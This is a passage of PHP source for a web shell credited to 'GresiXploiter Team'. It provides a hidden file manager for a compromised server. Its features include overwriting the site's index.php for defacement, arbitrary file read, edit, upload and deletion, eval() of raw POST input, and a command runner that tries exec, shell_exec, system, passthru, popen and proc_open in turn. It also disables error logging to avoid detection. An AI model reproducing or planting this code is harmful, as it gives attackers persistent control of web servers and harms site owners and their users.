    <input type=\"submit\" name=\"submit\" value=\"Ngindex\" />

    </form>";
    echo "<font color=black size=5>";
  $user = get_current_user();
  $site = $_SERVER['HTTP_HOST'];
  $ips = getenv('REMOTE_ADDR');

  if(isset($_POST['submit'])){

    $email = $_POST['indexnya'];
    $wr = $email;
  $f = fopen('/home/'.$user.'/public_html/index.php', 'w');
  fwrite($f, $wr);
  fclose($f);
  $f = fopen('/home/'.$user.'/index.php', 'w');
  fwrite($f, $wr);
  fclose($f);
  $parm = $site.'/index.php';
  echo '<br/><center><font size=5>Berhasil Ngindex : '.$parm.'</center>';
  }

}
  ?>
<?php
error_reporting(0);
set_time_limit(0);
extract(start());
if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
$_POST['path'] = (isset($_POST['path'])) ? g22b_crypt($_POST['path'],'de') : false;
$_POST['name'] = (isset($_POST['name'])) ? g22b_crypt($_POST['name'],'de') : false;
if(isset($_GET['option']) && $_POST['opt'] == 'download'){
    header('Content-type: text/plain');
    header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
    echo(file_get_contents($_POST['path']));
    exit();
}

echo '<!DOCTYPE html>
<html>
<head>
    <meta name="robots" content="noindex" />
  <style>
        #container{
            width: auto;
            margin: 10px;
      padding: 10px;
            border: 1px solid black;
      
        }

        textarea{
          width: 250px;
        }
    #show{
      padding: 10px;
        }
        #header{
            text-align: center;
            border-bottom: 1px dotted black;
        }
        #header h1{
            margin: 0;
        }
        
        #nav,#menu{
            padding-top: 5px;
            margin-left: 5px;
            padding-bottom: 5px;
            overflow: hidden;
            border-bottom: 1px dotted black;
        }
        #nav{
            margin-bottom: 10px;
        }
        
        #menu{
            text-align: center;
        }
        
        #content{
            margin: 0;
      width: auto;
        }
        
        #content table{
            width: 750px;
            margin: 0px;
        }
        #content table .first{
            background-color: silver;
            text-align: center;
        }
        #content table .first:hover{
            background-color: silver;
            text-shadow:0px 0px 1px #757575;
        }
        #content table tr:hover{
            background-color: #636263;
            text-shadow:0px 0px 10px #fff;
        }
        
        #footer{
            margin-top: 10px;
            border-top: 1px dotted black;
        }
        #footer p{
            margin: 5px;
            text-align: center;
        }
        .filename,a{
            color: #000;
            text-decoration: none;
            cursor: pointer;
        }
        .filename:hover,a:hover{
            color: #fff;
            text-shadow:0px 0px 10px #ffffff;
        }
        .center{
            text-align: center;
        }
        .yoi {
  height: 45px;
  width: 150px;
  font-family: Oxanium;
  border:black solid;
  font-size: 25px;
  color: black;
  border-radius: 20px;
  background-color: #b0d12a;

}
        input,textarea{
            border: 4px black solid;
            height: 400px;
            width: 550px;
            border-radius:2px;
        }
    </style>
    <script>
function Encoder(name)
{
  var e =  document.getElementById(name);
  e.value = btoa(e.value);
  return true;
}
</script>
</head>
<body>
    <br><hr color=black><hr color=black><center><div class="path"><font size=5>Current Path : '.nav_link().'<hr color=black><hr color=black>';
if(isset($_GET['cpanel'])){
    
  }else{

        if(isset($_GET['filesrc'])){
            $file = g22b_crypt($_GET['filesrc'],'de');
            echo '<div class="">Current File : '.htmlspecialchars($file).'</div><textarea style="width:750px; height:750px; font-size:16px;">'.filesrc($file).'</textarea></pre>';
        }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete' || (isset($_GET['new']) && $_POST['type'] == 'file')){

            echo '<div class="center">'.$_POST['name'].'<br />';
            
            if($_POST['opt'] == 'chmod'){
                if(isset($_POST['perm'])){
    
                    eval('$perm = '.$_POST['perm'].';');
                    if(chmod($_POST['path'],$perm)){
                        echo '<font color="green"><font size=5>Permission berhasil diubah !</font><br />';
                        $permdone = true;
                    }else{
                        echo '<font color="red"><font size=5>Permission tidak dapat diubah !</font><br />';
                    }
                }
                if($permdone){
                    $perm = $_POST['perm'];
                }else{
                    $perm = substr(sprintf('%o', fileperms($_POST['path'])), -4);
                }
                
                echo '<form method="POST">
                <font size=5>Permission : <input name="perm" type="text" size="4" value="'.$perm.'" />
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'">
                <input type="hidden" name="opt" value="chmod"><br><br>
                <input type="submit" value="Change" />
                </form>';
            }elseif($_POST['opt'] == 'rename'){
                
                if(isset($_POST['newname'])){
                    if(rename($_POST['path'],$currentpath.'/'.$_POST['newname'])){
                        echo '<font color="green"><font size=5>Mengubah nama berhasil !</font><br />';
                        $_POST['name'] = $_POST['newname'];
                    }else{
                        echo '<font color="red"><font size=5>Gagal mengubah nama !</font><br />';
                    }
                }
                
                echo '<div id="show"><form method="POST">
                <font size=5>New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'">
                <input type="hidden" name="opt" value="rename"><br><br>
                <input type="submit" value="Rename" />
                </form></div>';
            }elseif($_POST['opt'] == 'edit' || isset($_GET['new'])){
                if(isset($_POST['src'])){
                    $fp = fopen($_POST['path'],'w');
                    if(fwrite($fp,base64_decode($_POST['src']))){
                        echo '<font color="green"><font size=5>Sukses mengedit file !</font><br />';
                        $done = true;
                    }else{
                        echo '<font color="red"><font size=5>File tidak dapat diedit !</font><br />';
                    }
                    fclose($fp);
                }
                if(isset($_GET['new']) && !$done){
                    $filecontent = '';
                    $_POST['path'] = "$currentpath/$_POST[name]";
                }else{
                    $filecontent = filesrc($_POST['path']);
                }
                echo '<div id="show"><form method="POST" onSubmit="Encoder(\'c\')">
                <center><textarea style="width:750px; height:750px;" name="src" id="c">'.$filecontent.'</textarea><br />
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'">
                <input type="hidden" name="type" value="file" />
                <input type="hidden" name="opt" value="edit"><br>
                <input type="submit" value="Edit" />
                </form></div>';
            }
            
            echo '</div>';
        }else{
            echo '';
            if($_POST['opt'] == 'delete'){
                if($_POST['type'] == 'dir'){
                    if(rmdir($_POST['path'])){
                        echo '<font color="green"><font size=5>Folder berhasil dihapus !</font><br />';
                    }else{
                        echo '<font color="red"><font size=5>Folder gagal dihapus !</font><br />';
                    }
                }elseif($_POST['type'] == 'file'){
                    if(unlink($_POST['path'])){
                        echo '<font color="green"><font size=5>File berhasil dihapus !</font><br />';
                    }else{
                        echo '<font color="red"><font size=5>File gagal dihapus !</font><br />';
                    }
                }
            }elseif($_POST['type'] == 'dir' && isset($_GET['new'])){
                if(mkdir("$currentpath/$_POST[name]")){
                    echo '<font color="green"><font size=5>Create Dir Done.</font><br />';
                }else{
                    echo '<font color="red"><font size=5>Create Dir Error.</font><br />';
                }
            }elseif(isset($_FILES['file'])){
                $userfile_name = $currentpath.'/'.$_FILES['file']['name'];
                $userfile_tmp = $_FILES['file']['tmp_name'];
                if(move_uploaded_file($userfile_tmp,$userfile_name)){
                    echo '<font color="green"><font size=5></font><br />';
                }else{
                    echo '<font color="red"><font size=5></font><br />';
                }
            }
            echo '<center><table style="width:0px; height:0px;">';
        
        $dirs = getfiles('dir');
        foreach($dirs as $dir){
        echo '<div id="dirs"><tr>
        <td><font size=5><br><a href="?path='.$dir['link'].'"><div class="filename"><i class="fa fa-folder"></i> '.$dir['name'].'</div></a></td>
        <td class="center">'.$dir['size'].'</td>
        <td class="center"><font color="'.$dir['permcolor'].'">'.$dir['perm'].'</font></td>
        <td class="center"><form method="POST" action="?path='.$currentpathen.'&option">
        <select name="opt">
        <option value="">&nbsp;Pilih disini...</option>
        <option value="delete">Delete</option>
        <option value="chmod">Chmod</option>
        <option value="rename">Rename</option>
        </select>
        <input type="hidden" name="type" value="dir">
        <input type="hidden" name="name" value="'.g22b_crypt($dir['name'],'en').'">
        <input type="hidden" name="path" value="'.$dir['link'].'">
        <button class="tusbol" type="submit"  value="EKSEKUSI" />>></button>
        </form></td>
        </tr>
        </div>';
        }
        echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
        
        $files = getfiles('file');
        foreach($files as $file){
            echo '<div id="files">
        
        <tr>
        <td><a href="?path='.$currentpathen.'&filesrc='.$file['link'].'">'.$file['name'].'</div></a></td>
        <td class="center">'.$file['size'].'</td>
        <td class="center"><font color="'.$file['permcolor'].'">'.$file['perm'].'</font></td>
        <td class="center"><form method="POST" action="?path='.$currentpathen.'&option">
        <select name="opt">
        <option value="">&nbsp;Pilih disini...</option>
        <option value="delete">Delete</option>
        <option value="chmod">Chmod</option>
        <option value="rename">Rename</option>
        <option value="edit">Edit</option>
        </select>
        <input type="hidden" name="type" value="file">
        <input type="hidden" name="name" value="'.g22b_crypt($file['name'],'en').'">
        <input type="hidden" name="path" value="'.$file['link'].'">
        <button class="tusbol" type="submit"  value=">>" />>></button>
        </form></td>
        </tr></div>';
        }
            echo '</table>';
        }
  } 
        echo '</div>
    </div>
    
  </body>
  </html>';


function getSafeMode()
{
        global $sm;
    if ($sm) {
      return '<font color="red">ON</font> (Most of the Features will Not Work)';
    }else{
      return '<font color="green">OFF</font>';
    }
        
}
function getfiles($type){
    global $currentpath;
    $dir = scandir($currentpath);
    $result = array();
    foreach($dir as $file){
        $current['fullname'] = "$currentpath/$file";
        if($type == 'dir'){
            if(!is_dir($current['fullname']) || $file == '.' || $file == '..') continue;
        }elseif($type == 'file'){
            if(!is_file($current['fullname'])) continue;
        }
        
        $current['name'] = $file;
        $current['link'] = g22b_crypt($current['fullname'],'en');
        $current['size'] = (is_dir($current['fullname'])) ? '<font size=6>...' : file_size($current['fullname']);
        $current['perm'] = perms($current['fullname']);
        if(is_writable($current['fullname'])){
            $current['permcolor'] = 'green';
        }elseif(is_readable($current['fullname'])){
            $current['permcolor'] = '';
        }else{
            $current['permcolor'] = 'red';
        }
        
        $result[] = $current;
        
    }
    return $result;
}
function start(){
    global $_POST,$_GET;
    
    $result['currentpath'] = (isset($_GET['path'])) ? g22b_crypt($_GET['path'],'de') : cwd();
    $result['currentpathen'] = (isset($_GET['path'])) ? $_GET['path'] : g22b_crypt(cwd(),'en');
    
    return $result;
}
function file_size($file){
    $size = filesize($file)/1024;
    $size = round($size,3);
    if($size >= 1024){
        $size = round($size/1024,2).' MB';
    }else{
        $size = $size.' KB';
    }
    return $size;
}
function g22b_crypt($txt,$type){
    if(function_exists('base64_encode') && function_exists('base64_decode')){
        return ($type == 'en') ? base64_encode($txt) : base64_decode($txt);
    }elseif(function_exists('strlen') && function_exists('dechex') && function_exists('ord') && function_exists('chr') && function_exists('hexdec')){
        return ($type == 'en') ? strToHex($txt) : hexToStr($txt);
    }else{
        $ar1 = array('public_html','.htaccess','/','.');
        $ar2 = array('bbbpubghostbbb','bbbhtaghostbbb','bbbsghostbbb','bbbdotghostbbb');
        return ($type == 'en') ? str_replace($ar1,$ar2,$txt) : str_replace($ar2,$ar1,$txt);
    }
}
function exec_all($command)
{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r");
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }
    return(htmlspecialchars($output));
}
if(function_exists('ini_set'))
{
    ini_set('error_log',NULL);  // No alarming logs
    ini_set('log_errors',0);    // No logging of errors
    ini_set('file_uploads',1);  // Enable file uploads
    ini_set('allow_url_fopen',1);   // allow url fopen 
}else{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
    ini_alter('file_uploads',1);
    ini_alter('allow_url_fopen',1);
}
function nav_link(){
    global $currentpath;
    $path = $currentpath;
    $path = str_replace('\\','/',$path);
    $paths = explode('/',$path);
    $result = '';
    foreach($paths as $id=>$pat){
        if($pat == '' && $id == 0){
            $a = true;
            $result .= '<a href="?path='.g22b_crypt("/",'en').'">/</a>';
            continue;
        }
        if($pat == '') continue;
        $result .= '<a href="?path=';
        $linkpath = '';
        for($i=0;$i<=$id;$i++){
            $linkpath .= "$paths[$i]";
            if($i != $id) $linkpath .= "/";
        }
        $result .= g22b_crypt($linkpath,'en');
        $result .=  '">'.$pat.'</a>/';
    }
    return $result;
}
function filesrc($file){
    return htmlspecialchars(file_get_contents($file));
}
function cwd(){
    if(function_exists('getcwd')){
        return getcwd();
    }else{
        $e = str_replace("\\","/",$path);
        $e = explode('/',$path);
        $result = '';
        for($i=0;$i<count($e)-1;$i++){
            if($e[$i] == '') continue;
            $result .= '/'.$e[$i];
        }
        return $result;
    }
}
function perms($file){
    $perms = @fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}?>


<br>
<tr>
<th> <br><font size="5" face="Rajdhani" color="white">&#8226; Copyright &copy; 2k19 <font size="5" face="Rajdhani" color="black" style="background-color: #b0d12a;border-radius: 8px;">&nbsp;GresiXploiter Team&nbsp;</font><font size="5" face="Rajdhani" color="white">&nbsp;&#8226;<br><br></th>
</tr>
</table>
</center>
</html>